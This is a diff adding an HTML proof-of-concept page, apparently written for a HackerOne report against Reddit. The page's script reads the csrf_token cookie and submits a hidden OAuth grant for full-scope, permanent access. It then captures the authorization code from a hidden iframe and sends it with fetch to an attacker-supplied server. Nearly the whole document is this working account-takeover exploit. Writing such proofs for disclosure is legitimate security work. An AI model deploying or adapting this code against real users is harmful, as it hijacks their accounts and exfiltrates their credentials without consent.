@@ -1,0 +1,90 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>docs proxy PoC</title>
+</head>
+<body style="font:15px/1.5 system-ui,sans-serif;max-width:52rem;margin:2rem auto;padding:0 1rem">
+<h1 style="font-size:1.4rem">HackerOne PoC: GitHub Pages file running on developers.reddit.com</h1>
+<p>Authorized test page. Open it only in a browser signed in to your own Reddit test account.</p>
+<table border="1" cellpadding="7" style="border-collapse:collapse;width:100%">
+<tr><td style="width:16rem"><b>Origin of this page</b></td><td id="origin"></td></tr>
+<tr><td><b>Clicks or key presses so far</b></td><td id="act"></td></tr>
+<tr><td><b>csrf_token cookie readable</b></td><td id="csrf">not checked</td></tr>
+<tr><td><b>OAuth code for this account</b></td><td id="code" style="word-break:break-all">not requested</td></tr>
+<tr><td><b>Sent to attacker server</b></td><td id="sent">no server given (add #hook=https://your-server to the URL)</td></tr>
+</table>
+<script>
+var HOST = 'developers.reddit.com';
+var CLIENT_ID = 'TWTsqXa53CexlrYGBWaesQ';            // public "Devvit CLI" client, it has no secret
+var hook = (location.hash.match(/hook=([^&]+)/) || [])[1];
+hook = hook ? decodeURIComponent(hook) : '';
+var state = Math.random().toString(36).slice(2);
+
+function set(id, text) { document.getElementById(id).textContent = text; }
+function csrf() {
+  var m = document.cookie.match(/(?:^|; )csrf_token=([^;]+)/);
+  return m ? m[1] : '';
+}
+
+function grant(token) {
+  var frame = document.createElement('iframe');
+  frame.name = 'g'; frame.style.display = 'none';
+  document.body.appendChild(frame);
+
+  var form = document.createElement('form');
+  form.method = 'POST'; form.target = 'g';
+  form.action = 'https://www.reddit.com/svc/shreddit/oauth-grant';
+  var fields = {
+    client_id: CLIENT_ID,
+    redirect_uri: 'https://' + HOST + '/cli-login',
+    scope: '*',
+    duration: 'permanent',
+    response_type: 'code',
+    authorize: 'ALLOW',
+    state: state,
+    csrf_token: token
+  };
+  for (var k in fields) {
+    var i = document.createElement('input');
+    i.type = 'hidden'; i.name = k; i.value = fields[k];
+    form.appendChild(i);
+  }
+  document.body.appendChild(form);
+  set('code', 'requesting ...');
+
+  var done = false;
+  frame.addEventListener('load', function () {
+    if (done) return;
+    done = true;
+    var code = '';
+    try { code = new URL(frame.contentWindow.location.href).searchParams.get('code') || ''; } catch (e) {}
+    if (!code) { set('code', 'none: the grant was refused'); return; }
+    set('code', code);
+    if (!hook) return;
+    set('sent', 'sending to ' + new URL(hook).host + ' ...');
+    var url = hook.replace(/\/+$/, '') + '/cb?state=' + state + '&code=' + encodeURIComponent(code);
+    fetch(url, { mode: 'no-cors', credentials: 'omit', referrerPolicy: 'no-referrer' }).then(
+      function () { set('sent', 'yes, one background request to ' + new URL(hook).host); },
+      function () { set('sent', 'failed, server unreachable'); });
+  });
+  form.submit();
+}
+
+set('origin', location.origin);
+if (location.hostname !== HOST) {
+  set('code', 'nothing to do: this page only acts when served under ' + HOST);
+} else {
+  set('act', navigator.userActivation && navigator.userActivation.hasBeenActive ? 'yes' : 'none');
+  var start = function () {
+    var t = csrf();
+    if (!t) { set('csrf', 'no'); return; }
+    set('csrf', 'yes');
+    grant(t);
+  };
+  if (csrf()) start();
+  else fetch('/', { credentials: 'include', cache: 'no-store' }).then(start, start);
+}
+</script>
+</body>
+</html>
